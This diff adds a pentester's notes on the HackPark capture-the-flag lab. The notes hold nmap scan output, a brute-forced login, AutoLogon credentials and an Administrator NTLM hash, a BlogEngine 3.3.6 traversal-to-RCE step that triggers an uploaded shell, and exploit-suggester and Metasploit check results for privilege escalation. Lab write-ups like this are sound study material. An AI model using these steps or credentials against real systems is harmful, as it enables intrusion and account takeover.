@@ -1,0 +1,332 @@
+
+OS: 
+
+Web-Technology:  Microsoft IIS 8.5. [Asp.Net](http://Ap.Net) 
+
+Hostname: 
+
+IP: 10.10.195.221
+
+Credentials: 
+
+admin: 1qaz2wsx
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/12ae87f2-5a66-4d26-a0ea-8a3473f29e77/Untitled.png)
+
+����������͹ Looking for AutoLogon credentials
+Some AutoLogon credentials were found
+DefaultUserName               :  administrator
+DefaultPassword               :  4q6XvFES7Fdxs
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/48158e07-0866-4cd1-99d0-efc6a53a15f7/Untitled.png)
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3352c0731470aabf133e0c84276adcba:::
+
+================================================================To-Try List
+
+80- brute forced login creds to blogengine 3.3.6.0. Blogengine is vulnerable to RCE via modifying and editing a post and uploafding a shell. 
+
+3389 - 
+
+================================================================
+
+NMAP Resuslts 
+
+Starting Nmap 7.94 ( [https://nmap.org](https://nmap.org/) ) at 2023-09-29 11:35 CDT
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 11:35
+Completed NSE at 11:35, 0.00s elapsed
+Initiating NSE at 11:35
+Completed NSE at 11:35, 0.00s elapsed
+Initiating NSE at 11:35
+Completed NSE at 11:35, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 11:35
+Completed Parallel DNS resolution of 1 host. at 11:35, 0.03s elapsed
+Initiating SYN Stealth Scan at 11:35
+Scanning 10.10.195.221 [65535 ports]
+Discovered open port 3389/tcp on 10.10.195.221
+Discovered open port 80/tcp on 10.10.195.221
+SYN Stealth Scan Timing: About 8.32% done; ETC: 11:41 (0:05:41 remaining)
+SYN Stealth Scan Timing: About 24.32% done; ETC: 11:39 (0:03:10 remaining)
+SYN Stealth Scan Timing: About 38.16% done; ETC: 11:39 (0:02:27 remaining)
+SYN Stealth Scan Timing: About 52.58% done; ETC: 11:39 (0:01:49 remaining)
+SYN Stealth Scan Timing: About 73.12% done; ETC: 11:38 (0:00:55 remaining)
+Completed SYN Stealth Scan at 11:38, 198.12s elapsed (65535 total ports)
+Initiating Service scan at 11:38
+Scanning 2 services on 10.10.195.221
+Completed Service scan at 11:40, 84.37s elapsed (2 services on 1 host)
+Initiating OS detection (try #1) against 10.10.195.221
+Retrying OS detection (try #2) against 10.10.195.221
+NSE: Script scanning 10.10.195.221.
+Initiating NSE at 11:40
+Completed NSE at 11:40, 5.12s elapsed
+Initiating NSE at 11:40
+Completed NSE at 11:40, 0.85s elapsed
+Initiating NSE at 11:40
+Completed NSE at 11:40, 0.00s elapsed
+Nmap scan report for 10.10.195.221
+Host is up (0.19s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 8.5
+| http-robots.txt: 6 disallowed entries
+| /Account/*.* /search /search.aspx /error404.aspx
+|_/archive /archive.aspx
+|*http-server-header: Microsoft-IIS/8.5
+| http-methods:
+|   Supported Methods: GET HEAD OPTIONS TRACE POST
+|*  Potentially risky methods: TRACE
+|_http-title: hackpark | hackpark amusements
+3389/tcp open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=hackpark
+| Issuer: commonName=hackpark
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2023-09-28T16:53:48
+| Not valid after:  2024-03-29T16:53:48
+| MD5:   c4fc:6700:7e16:2108:9a26:aa39:9461:d3f6
+|*SHA-1: 6706:bb42:1f47:c381:4fb5:233e:ecde:2365:e787:f7d3
+| rdp-ntlm-info:
+|   Target_Name: HACKPARK
+|   NetBIOS_Domain_Name: HACKPARK
+|   NetBIOS_Computer_Name: HACKPARK
+|   DNS_Domain_Name: hackpark
+|   DNS_Computer_Name: hackpark
+|   Product_Version: 6.3.9600
+|*  System_Time: 2023-09-29T16:59:40+00:00
+|_ssl-date: 2023-09-29T16:59:45+00:00; +19m27s from scanner time.
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Uptime guess: 0.005 days (since Fri Sep 29 11:33:21 2023)
+TCP Sequence Prediction: Difficulty=258 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 19m26s, deviation: 0s, median: 19m26s
+
+NSE: Script Post-scanning.
+Initiating NSE at 11:40
+Completed NSE at 11:40, 0.00s elapsed
+Initiating NSE at 11:40
+Completed NSE at 11:40, 0.00s elapsed
+Initiating NSE at 11:40
+Completed NSE at 11:40, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 293.65 seconds
+Raw packets sent: 131286 (5.782MB) | Rcvd: 1071 (205.860KB)
+
+================================================================
+
+Web-Service Escalation
+
+[fuzzed the login page with burp. found login credentials with seclist master password list ](https://www.notion.so/fuzzed-the-login-page-with-burp-found-login-credentials-with-seclist-master-password-list-5931696649974b00a2c46badb936aad5?pvs=21)
+
+WE uploaded a file to the post. and set up a listener. for it.  
+
+(navigated to http://10.10.195.221/?theme=../../App_Data/files) to execute file
+
+[BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution](https://www.exploit-db.com/exploits/46353)
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/ce5c201e-f57c-47d1-bdb2-be3ed69589e5/Untitled.png)
+
+================================================================
+
+Other / PRiviledge Escalaiton
+
+Host Name:                 HACKPARK
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server&*(
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+
+Product ID:                00252-70000-00000-AA886
+Original Install Date:     8/3/2019, 10:43:23 AM
+System Boot Time:          9/29/2023, 9:52:48 AM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+[01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.11.amazon, 8/24/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     4,096 MB
+Available Physical Memory: 3,170 MB
+Virtual Memory: Max Size:  5,504 MB
+Virtual Memory: Available: 4,534 MB
+Virtual Memory: In Use:    970 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 8 Hotfix(s) Installed.
+[01]: KB2919355
+[02]: KB2919442
+[03]: KB2937220
+[04]: KB2938772
+[05]: KB2939471
+[06]: KB2949621
+[07]: KB3035131
+[08]: KB3060716
+Network Card(s):           1 NIC(s) Installed.
+[01]: AWS PV Network Device
+Connection Name: Ethernet 2
+DHCP Enabled:    Yes
+DHCP Server:     10.10.0.1
+IP address(es)
+[01]: 10.10.195.221
+[02]: fe80::544d:e0a:94c2:a44e
+
+used windows eploit checker: 
+
+──(notroot㉿kali)-[/opt/Windows-Exploit-Suggester]
+└─$ ./windows-exploit-suggester.py --database 2023-09-15-mssb.xls --systeminfo systeminfo.txt
+[*] initiating winsploit version 3.3...
+[*] database file detected as xls or xlsx based on extension
+[*] attempting to read from the systeminfo input file
+[+] systeminfo input file read successfully (ascii)
+[*] querying database file for potential vulnerabilities
+[*] comparing the 8 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
+[*] there are now 249 remaining vulns
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+] windows version identified as 'Windows 2012 R2 64-bit'
+[*]
+[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
+[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
+[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
+[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
+[*]
+[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
+[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
+[*]
+[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
+[*]   https://github.com/foxglovesec/RottenPotato
+[*]   https://github.com/Kevin-Robertson/Tater
+[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
+[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
+[*]
+[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
+[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
+[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
+[*]
+[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
+[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
+[*]
+[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
+[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
+[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
+[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
+[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
+[*]
+[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
+[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
+[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
+[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
+[*]
+[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
+[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
+[*]
+[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
+[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
+[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
+[*]
+[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
+[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
+[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
+[*]
+[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
+[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
+[*]
+[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
+[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
+[*]
+[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
+[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
+[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
+[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
+[*]
+[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
+[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
+[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
+[*]
+[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
+[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
+[*]
+[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
+[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
+[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
+[*]
+[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
+[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
+[*]
+[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
+[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
+[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
+[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
+[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
+[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
+[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
+[*]
+[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
+[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
+[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
+[*]
+[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
+[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
+[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
+[*]
+[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
+[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
+[*]   http://www.exploit-db.com/exploits/34458/
+[*]
+[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
+[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
+[*]
+[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
+[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
+[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
+[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
+[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
+[*] done
+
+*] 10.10.195.221 - Collecting local exploits for x64/windows...
+[*] 10.10.195.221 - 186 exploit checks are being tried...
+[+] 10.10.195.221 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.195.221 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
+[+] 10.10.195.221 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
+[+] 10.10.195.221 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
+[+] 10.10.195.221 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 8.1/Windows Server 2012 R2 build detected!
+[+] 10.10.195.221 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.195.221 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+[+] 10.10.195.221 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
+[*] Running check method for exploit 43 / 43
+[*] 10.10.195.221 - Valid modules for session 3:
+
+# Name Potentially Vulnerable? Check Result
+
+---
+
+1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+2   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
+3   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
+4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
+
+5   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 8.1/Windows Server 2012 R2 build detected!
+
+6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+7   exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
+8   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
+
+=============================================================
